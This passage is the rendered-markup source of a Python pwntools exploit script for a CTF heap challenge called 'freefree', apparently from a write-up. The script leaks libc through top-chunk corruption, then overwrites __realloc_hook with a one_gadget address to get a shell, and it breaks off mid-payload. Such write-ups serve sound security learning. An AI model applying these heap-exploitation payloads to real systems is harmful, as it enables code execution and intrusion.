punctuation\",children:\":\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"\tp\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"sendlineafter\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"b'\u003e '\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'puts({})'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),(0,e.jsx)(n.span,{className:\"token builtin\",children:\"format\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"getchar\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"index\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"encode\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"\t\",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Receive data outside\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,e.jsx)(n.span,{className:\"token function\",children:\"GDB\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"\tcommand\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token triple-quoted-string string\",children:`'''\n`})]}),(0,e.jsx)(n.span,{className:\"code-line\",children:(0,e.jsx)(n.span,{className:\"token triple-quoted-string string\",children:`\tb*main+98\n`})}),(0,e.jsx)(n.span,{className:\"code-line\",children:(0,e.jsx)(n.span,{className:\"token triple-quoted-string string\",children:`\tb*main+215\n`})}),(0,e.jsx)(n.span,{className:\"code-line\",children:(0,e.jsx)(n.span,{className:\"token triple-quoted-string string\",children:`\tb*main+226\n`})}),(0,e.jsx)(n.span,{className:\"code-line\",children:(0,e.jsx)(n.span,{className:\"token triple-quoted-string string\",children:`\tb*main+316\n`})}),(0,e.jsx)(n.span,{className:\"code-line\",children:(0,e.jsx)(n.span,{className:\"token triple-quoted-string string\",children:`\tc\n`})}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token triple-quoted-string string\",children:\"\t'''\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"\t\",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# b*sysmalloc\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"\t\",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"with\"}),\" \",(0,e.jsx)(n.span,{className:\"token builtin\",children:\"open\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'/tmp/command.gdb'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'wt'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"as\"}),\" f\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"\t        f\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"write\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"command\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"\tsubprocess\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"Popen\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'/usr/bin/x-terminal-emulator'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'-e'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'gdb'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'-p'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token builtin\",children:\"str\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"p\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"pid\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'-x'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'/tmp/command.gdb'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"\t\",(0,e.jsx)(n.span,{className:\"token builtin\",children:\"input\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\"         \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# input() to make program wait with gdb\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# p = process('./freefree_patched')\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"p \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" connect\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'34.136.108.210'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"40007\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"n \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"10\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"########################################\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"### Stage 1: Leak main arena address ###\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"########################################\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"log\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"info\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'Stage 1: Leak main arena address...'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Malloc to control all next chunks\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"malloc\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\"n\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x10\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Change top chunk size\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"b'\\\\x00'\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"*\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0x10\"}),\"    \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# chunk data\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"b'\\\\x00'\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"*\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0x8\"}),\"    \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Prevsize\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0xd51\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"gets\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\"n\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" payload\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Trigger to free top chunl\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"malloc\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"1\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\"n\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x1000\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Malloc to get libc main arena address\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"malloc\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"2\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\"n\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x100\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"puts\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"2\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\"n\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"libc_main_arena \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" u64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"p\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"recvline\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"1\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"b'\\\\x00\\\\x00'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"log\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"success\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'Libc main_arena: '\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\" \",(0,e.jsx)(n.span,{className:\"token builtin\",children:\"hex\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"libc_main_arena\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"libc\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"address \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" libc_main_arena \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),\" libc\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"sym\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'main_arena'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"log\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"success\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'Libc main_arena: '\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\" \",(0,e.jsx)(n.span,{className:\"token builtin\",children:\"hex\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"libc\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"address\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"####################################\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"### Stage 2: Free 2 small chunks ###\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"####################################\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"log\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"info\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'Stage 2: Free 2 small chunks...'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# First freed chunk\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Change top chunk size to 0x20300\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"malloc\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"1\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\"n\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0xcf0\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0x10\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Overwrite top chunk size to 0x300\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"b'\\\\x00'\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"*\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0xcf0\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0x10\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"b'\\\\x00'\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"*\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"8\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0x301\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"gets\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"1\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\"n\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" payload\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Trigger to free top chunk\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"malloc\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"2\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\"n\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x1000\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Second freed chunk\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Change top chunk size to 0x20300\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"malloc\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"2\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\"n\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0xcf0\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0x10\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Overwrite top chunk size to 0x300\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"b'\\\\x00'\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"*\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0xcf0\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0x10\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"b'\\\\x00'\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"*\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"8\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0x301\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"gets\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"2\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\"n\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" payload\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Trigger to free top chunk\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"malloc\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"3\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\"n\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x1000\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"##########################\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"### Stage 3: Get shell ###\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"##########################\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"log\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"info\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'Stage 3: Get shell...'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"b'\\\\x00'\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"*\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0xcf0\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0x10\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"b'\\\\x00'\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"*\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"8\"}),\"    \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Prevsize\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0x2e1\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"libc\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"sym\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'__realloc_hook'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"gets\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"2\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\"n\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" payload\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"malloc\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"3\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\"n\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x2e0\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0x10\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"malloc\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"3\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\"n\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x2e0\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0x10\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"libc\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"address \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0xe6aee\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"libc\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"sym\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),(0,e.jsx)(n.span,{className:\"token 